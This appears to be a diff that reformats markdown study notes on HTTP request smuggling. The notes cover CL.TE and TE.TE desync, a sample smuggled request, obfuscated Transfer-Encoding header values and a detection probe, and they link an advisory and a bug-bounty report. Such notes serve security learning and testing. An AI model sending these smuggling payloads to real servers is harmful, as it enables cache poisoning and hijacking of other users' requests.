@@ -10,7 +10,7 @@ server and these two/more servers tend to parse these HTTP requests
 slightly differently. 
 
 # On Transfer-Encoding and Content-Length
-If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.
+If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter **MUST** be ignored.
 Whenever we find a way to hide the Transfer-Encoding header from one server in a chain it will fall back to using the Content-Length and we can desynchronize the whole system
 
 # TE.TE 
@@ -19,24 +19,23 @@ support Transfer-Encoding but one can be induced to ignore
 the header by obfuscating the header value. 
 
 # Sample Request
-```
-POST / HTTP/1.1
-Host: example.com
-Content-Length: 6
-Transfer-Encoding: chunked
+    POST / HTTP/1.1
+    Host: example.com
+    Content-Length: 6
+    Transfer-Encoding: chunked
 
-0\r\n
-G\r\n
-\r\n
-POST / HTTP/1.1
-Host: example.com
+    0\r\n
+    G\r\n
+    \r\n
+    POST / HTTP/1.1
+    Host: example.com
 
 
-0 (1 byte)
-\r\n (carriage return + line feed, 2 bytes)
-G (1 byte)
-\r\n (carriage return + line feed, 2 bytes)
-```
+    0 (1 byte)
+    \r\n (carriage return + line feed, 2 bytes)
+    G (1 byte)
+    \r\n (carriage return + line feed, 2 bytes)
+
 
 # Obfuscating Payloads 
     Transfer-Encoding: xchunked
@@ -57,8 +56,9 @@ G (1 byte)
 
 
 # Detecting HTTP Request Smuggling
-I'll refer to this orientation as CL.TE for short. 
-We can detect potential request smuggling by sending the following request:  
+I'll refer to this orientation as `CL.TE` for short. 
+We can detect potential request smuggling by sending the following request:
+
     POST /about HTTP/1.1
     Host: example.com
     Transfer-Encoding: chunked
@@ -80,7 +80,7 @@ thanks to the invalid chunk size `Q`. This prevents the back-end socket from bei
 
 
 # Further Research:
-[Varnish]: https://docs.varnish-software.com/security/VSV00011/
+[Varnish](https://docs.varnish-software.com/security/VSV00011/)
 
 # Real World Exploits
-[Request Smuggling -> Web Cache Poisoning]: https://hackerone.com/reports/919175
+[Request Smuggling -> Web Cache Poisoning](https://hackerone.com/reports/919175)
